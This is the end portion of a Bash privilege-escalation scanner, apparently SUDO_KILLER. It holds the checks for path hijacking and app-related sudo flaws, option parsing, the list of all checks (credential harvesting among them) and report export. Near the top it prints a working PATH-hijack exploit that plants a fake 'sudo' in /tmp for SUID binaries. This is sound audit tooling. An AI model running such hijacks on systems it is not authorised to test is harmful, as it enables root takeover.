            echo -e "[+] ${YELLOW}It is possible to abuse environment path hijacking for the SUID binary:${RESET} $value"
            echo -e "[*] Exploit: export PATH=/tmp:\$PATH;echo '#!/bin/bash' > /tmp/sudo;echo 'id' >> /tmp/sudo; chmod +x /tmp/sudo; $value; rm /tmp/sudo"
            echo -e "[*] Don't forget to remove /tmp from PATH!\n"
        fi
    done

fi
}


checkenvpathhijack() {
  echo -e "${BOLD}${YELLOW}[20/21] ====== Environment Path Hijacking ====== ${RESET} \n"
  checkcustomsecurepath
  fn_env_path_hijack
  fn_suid_with_sudo
  echo -e "${BOLD}${BLUE}\n[@] Check [20/21] Completed!${RESET} \n"

}

checksudoappvuln()
{
echo -e "${BOLD}${YELLOW}[21/21] ====== App/Device Related Sudo vuln/misconfig ====== ${RESET} \n"
   if [ "$appsudocve" ]; then
    ./res/SK-app-check.sh
   else
    echo -e "${BOLD}${RED}Checks related to App/Device were skipped. To include them use the flag -a ${RESET} \n"
   fi
}

#------------------------------------------------------

footer() {
  echo -e "\n${GREEN}[*##################### SCAN_COMPLETED ##########################*] ${RESET} "
}

####################################################################################

# trap ctrl-c and call ctrl_c()
trap ctrl_c INT

function ctrl_c() {
  echo "--------"
}

while getopts "hcaesi:r:p:" opt; do
  case $opt in
  h)
    header
    usage
    exit
    ;;
  c)
    sudocve="1"
    ;;
  a)
    appsudocve="1"
    ;;
  e)
    exports="1"
    ;;
  s)
    sudopass="1"
    ;;
  i)
    import="$OPTARG"
    ;;
  r)
    report="$OPTARG"
    ;;
  p)
    path="$OPTARG"
    ;;
  \?)
    echo "Invalid option -$OPTARG" >&2
    ;;
  esac
done

call_each() {
  header
  init
  intro
  checkinitial
  checkcve
  checkmisconfig
  checkmissing
  checkcredharvest
  checkdangenvar
  checkdangbin
  checkrecurimper
  checkenvpathhijack
  checksudoappvuln
  footer
}

# if [ -n "$path" ]; then
#   vpath="/$path/sudo_killer-export-$(date +'%d-%m-%y')"
# else
#   vpath="/tmp/sudo_killer-export-$(date +'%d-%m-%y')"
# fi

# # Create the directory
# mkdir -p "$vpath"

# # Redirect the output to the report file if provided, otherwise to /dev/null
# if [ -n "$report" ] || [ -n "$export" ]; then
#   call_each | tee -a "$vpath/$report" 2> /dev/null
# else
#   call_each 2> /dev/null
# fi

if [ "$path" ]; then
  mkdir -p /$path/sudo_killer-export-$(date +"%d-%m-%y") 2>/dev/null
  call_each | tee -a /$path/sudo_killer-export-$(date +"%d-%m-%y")/$report 2>/dev/null
else
  :
  if [ "$report" ] || [ "$export" ]; then
    mkdir -p /tmp/sudo_killer-export-$(date +"%d-%m-%y") 2>/dev/null
    call_each | tee -a /tmp/sudo_killer-export-$(date +"%d-%m-%y")/$report 2>/dev/null
  else
    :
    call_each 2>/dev/null
  fi

fi


